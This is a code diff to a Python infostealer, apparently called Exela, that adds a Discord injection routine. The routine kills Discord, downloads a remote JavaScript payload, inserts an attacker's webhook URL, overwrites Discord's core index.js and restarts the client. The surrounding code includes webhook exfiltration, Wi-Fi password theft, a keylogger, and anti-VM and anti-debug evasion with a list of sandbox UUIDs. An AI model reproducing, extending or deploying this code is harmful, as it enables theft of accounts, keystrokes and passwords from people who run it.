@@ -10,12 +10,12 @@ Anti_Vm = "%AnTiVm%"
 wantS = "%StartuP%"
 methodxd = "%MethoD%"
 injectKeylogger = "%keyloggerinject???%"
+inject_discord = "%Inject_discord%"
 
 def create_mutex(mutex_value) -> bool:
     kernel32 = ctypes.windll.kernel32 #kernel32.dll 
     mutex = kernel32.CreateMutexA(None, False, mutex_value) # creating mutext
     return kernel32.GetLastError() != 183 # return if the mutex created successfully or not
-
 class QuicaxdExela:
     def __init__(self):
         self.hook = dhooks.Webhook(UrLxD,avatar_url="https://i.hizliresim.com/94iepii.jfif", username="quicaxd")
@@ -1163,7 +1163,44 @@ class QuicaxdExela:
                 self.get_all_system_data()
             if 7855 < 8888:
                 self.GetWifiPasswords(tmp + f"\\{run}")
-
+class DiscordInjection:
+    def __init__(self) -> None:
+        self.local_appdata = os.getenv("LOCALAPPDATA")
+        self.discord_path = os.path.join(self.local_appdata, "Discord")
+        self.callBack()
+    def callBack(self):
+        self.kill_dc()
+        self.write_injection()
+        self.start_dc()
+    def find_index_path(self) -> str:
+        if not os.path.isdir(self.discord_path):
+            return
+        else:
+            for file in os.listdir(self.discord_path):
+                if re.search(r'app-+?', file):
+                    modules_dir = os.path.join(self.discord_path,file, "modules")
+                    for modules_files in os.listdir(modules_dir):
+                        if re.search(r'discord_desktop_core-+?', modules_files):
+                            core_path = os.path.join(modules_dir, modules_files, "discord_desktop_core")
+                            index_path = os.path.join(core_path, "index.js")
+                            if os.path.isfile(index_path):
+                                return index_path
+    def get_injection_code(self) -> str:
+        code = requests.get("https://raw.githubusercontent.com/quicaxd/Exela-V2.0/main/injection/injection.js").text
+        replaced_code = code.replace("%WEBHOOK%",UrLxD)
+        return replaced_code
+    def write_injection(self):
+        file_path = self.find_index_path()
+        get_injection_code = self.get_injection_code()
+        with open(file_path, "w", encoding="utf-8", errors="ignore") as lol:
+            lol.write(get_injection_code)
+    def kill_dc(self):
+        for proc in psutil.process_iter():
+            if 'discord' in proc.name().lower():
+                proc.kill()
+    def start_dc(self):
+        command = os.path.join(self.discord_path, "Update.exe") + " --processStart Discord.exe"
+        subprocess.run(command, shell=True)   
 class KeyboardLogger:
     def __init__(self, output_file, webhook_url) -> None:
         self.output_file = output_file
@@ -1460,8 +1497,7 @@ class HardAntiVM:
                 else:
                     return False   
         except:
-            return False   
-            
+            return False             
 class AntiDebug:
     def __init__(self) -> None:
         self.banned_uuids = ["7AB5C494-39F5-4941-9163-47F54D6D5016","129B5E6B-E368-45D4-80AB-D4F106495924","8F384129-F079-456E-AE35-16608E317F4F","E6833342-780F-56A2-6F92-77DACC2EF8B3", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "71DC2242-6EA2-C40B-0798-B4F5B4CC8776", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-AC1F6BD04C9E", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
@@ -1504,6 +1540,9 @@ def injectKeyloggers():
             logger.start_logging()
         except Exception as e:
             print(str(e))
+def inject_dc():
+    if inject_discord == "true":
+            DiscordInjection()
 def callAllFunctions():
     try:
         AntiDebug()
@@ -1513,6 +1552,7 @@ def callAllFunctions():
             thread.join()
         else:
             HardAntiVM()
+        inject_dc()
         injectKeyloggers()
     except:
         pass
